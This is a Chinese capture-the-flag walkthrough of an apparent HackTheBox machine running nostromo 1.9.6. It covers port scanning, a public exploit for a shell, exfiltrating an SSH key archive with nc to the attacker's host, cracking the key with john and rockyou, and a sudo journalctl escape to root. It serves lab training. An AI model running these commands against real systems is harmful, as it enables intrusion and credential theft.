常规扫端口：

`nmap -A -sC 10.10.10.165`

  

![](../Images/6ae5b1cbb9e5aeb99c38f269b83158e5.png "image.png")

  

访问 80 端口，发现有个发邮件的功能

  

![](../Images/46984c8d03c04ac39a69843fd9807baa.png "image.png")

  

发现它的中间件是 nostromo 1.9.6

  

![](../Images/0046a8fb86352f2597ce7d5c462c8ac1.png "image.png")

  

搜一下 exp

  

![](../Images/7724dff37dc5fadeb9f1ad80964143a7.png "image.png")

  

exp直接利用，得到 www-data 权限的 shell

  

![](../Images/1d2a4bb9c51c80209a8f9bb64cdbdbd3.png "image.png")

  

看一下 /etc/passwd，发现有个叫 david 的用户

  

![](../Images/269c4af9b10c3c982e401aa3e4e3e898.png "image.png")

  

可以使用：`python -c "import pty;pty.spawn('/bin/bash')"`

来生成一个比较好看的终端样子，就像下面这样

  

![](../Images/2cce9f676fbbb400645e5a5671ecbc7d.png "image.png")

  

cd 到 /var/nostromo/conf 看一下有啥，`ls -al`  起码要用 -a 啊，不要错过什么东西

  

![](../Images/851a737559475598b6ec9d237a273d94.png "image.png")

  

cat 一下 nhttpd.conf ，发现了一个叫 public\_www 的文件夹

  

![](../Images/d1b9a3071f3769f6c0165c00e1a14023.png "image.png")

  

进去看一下：

  

![](../Images/055f4033f5a519d50819704a28ded9d0.png "image.png")

  

新开一个终端，`nc -lvp 10001 >backup-ssh-identity-files.tgz` 用来接收那个压缩包

shell 里面使用 `nc 10.10.15.84 10001 < backup-ssh-identity-files.tgz`

  

这样就把压缩包给下到本地 kali 机了

  

![](../Images/8297b154e769c8ad86cb700ac07322d6.png "image.png")

  

下载出来的文件里有 ssh 的密钥

  

![](../Images/882cd18c97204672353477b2c69e33b0.png "image.png")

  

  

使用 jhon 破解一下看看把

*   

```
`/usr/share/john/ssh2john.py /root/Desktop/home/david/.ssh/id_rsa > id_rsa.hash`
```

先换成 jhon 能识别的格式  

  

*   

```
`/sbin/john /root/Desktop/home/david/.ssh/id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt`
```

rockyou.txt 字典爆破一波  

  

![](../Images/50c98f8f92370250643755b240f4ed82.png "image.png")

  

得到密钥密码，hunter

ssh 登录一波

  

![](../Images/2df82971d5da487f866eb3d0ed9910d2.png "image.png")

  

拿到 user.txt

  

![](../Images/361223fd6a12665f647bc2918d142b81.png "image.png")

  

在 bin 目录下发现其他的东西

  

![](../Images/4472e9d948a9e4a53fe25f0f475c1e07.png "image.png")

  

![](../Images/c9edbd04033405954ef697aea3a74904.png "image.png")

  

在窗口被拉小的时候会触发应用，可以获取root的权限

  

![](../Images/ebf4e103ec771bb41e9cbbcb005ef8c5.png)

  

运行时，把窗口缩小一点，再输入!/bin/sh，成功获得root权限：

*   

```
`/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service`
```
